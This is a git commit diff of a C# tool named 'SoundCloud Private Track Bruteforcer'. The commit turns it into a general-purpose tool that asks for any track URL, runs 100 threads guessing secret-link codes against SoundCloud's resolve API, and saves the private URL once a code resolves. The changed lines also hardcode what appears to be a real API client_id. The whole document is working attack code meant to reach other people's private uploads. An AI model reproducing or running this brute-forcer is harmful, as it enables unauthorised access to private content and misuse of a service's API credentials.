64c973cb99d9a398959e847159aa28fb7483a595
Microsocks <barclayethan@gmail.com>
2019-01-25 16:59:29 -0500

    Update Program.cs

--- SoundCloud Private Track Bruteforcer/Program.cs
+++ SoundCloud Private Track Bruteforcer/Program.cs
@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
@@ -13,52 +13,81 @@ namespace SoundCloud_Private_Track_Bruteforcer
         static void Main(string[] args)
         {
             string finalCode = "";
-            string generatedCode = ""; 
-            List<Thread> Threads = new List<Thread> { };
-            int Steps = 0;
+            string generatedCode = "";
+            string url = "";
+            int oldCps = 0;
+            int cps = 0;
             long StartTime;
             long codesChecked = 0;
             bool finished = false;
+            List<Thread> Threads = new List<Thread> { };
             StartTime = DateTime.UtcNow.Ticks;
 
-            Console.WriteLine("Searching for Leave by XXXTENTACION SoundCloud Secret Code. Written by Microsocks");
+            Console.WriteLine("URL? Example Format: http://soundcloud.com/jahseh-onfroy/leave\nMake sure to remove the s in https so it is http");
+            url = Console.ReadLine();
+            Console.Clear();
+            
+            Console.WriteLine("Searching for Track Secret Code.");
+
+            // Start threads
+            for (int i = 0; i < 100; i++)
+            {
+                Threads.Add(new Thread(() => MainThread()));
+                Threads[i].Start();
+            }
+
+            // Code counter
             while (!finished)
             {
-                generatedCode = RandomCode();
-                Threads.Add(new Thread(() => CheckCode(generatedCode)));
-                Threads[Threads.Count - 1].Start();
-                if (Threads.Count >= 1000 && !finished) { for (int i = 0; i < Threads.Count; i++) { if (Threads[i].IsAlive == false && !finished) { Threads.RemoveAt(i); } } }
-                if (DateTime.UtcNow.Ticks - StartTime >= 10000000 && !finished) { Console.Write("\rCodes Checked Per Second: " + Steps + " Codes Checked: " + codesChecked); StartTime = DateTime.UtcNow.Ticks; Steps = 0; }
+                if (DateTime.UtcNow.Ticks - StartTime >= 10000000)
+                {
+                    Console.Write("\rCodes Checked: " + codesChecked + " Codes Per Second: " + cps);
+                    oldCps = cps;
+                    StartTime = DateTime.UtcNow.Ticks;
+                    cps = 0;
+                }
+                else
+                {
+                    Console.Write("\rCodes Checked: " + codesChecked + " Codes Per Second: " + oldCps);
+                }
+            }
+
+            void MainThread()
+            {
+                while (!finished)
+                {
+                    generatedCode = RandomCode();
+                    CheckCode(generatedCode);
+                }
             }
 
             void CheckCode(string Code)
             {
                     string Response = getResponse(Code);
-                    if (Response != null)
+                    if (Response != null) // Found URL
                     {
                         finalCode = Code;
                         Console.WriteLine("URL Found. URL: " + Code);
                         SaveCodeToFile();
                         finished = true;
                     }
-                    else
+                    else // Invalid URL
                     {
-                        //Console.WriteLine("Invalid URL");
                         codesChecked++;
+                        cps++;
                     }
-                    Steps++;
             } 
 
             string getResponse(string code)
             {
                 try
                 {
-                    WebRequest request = WebRequest.Create("https://api.soundcloud.com/resolve?url=http://soundcloud.com/jahseh-onfroy/leave/s-" + code + "&client_id=CLIENT_ID");
+                    WebRequest request = WebRequest.Create("https://api.soundcloud.com/resolve?url=" + url + "/s-" + code + "&client_id=v4hEbr6QReyb81OAe82kyvhbvzPOES4V");
 
                     HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                     return response.ToString();
                 }
-                catch { return null; }
+                catch { return null; } // Return null if error is thrown (wrong code)
             }
 
             
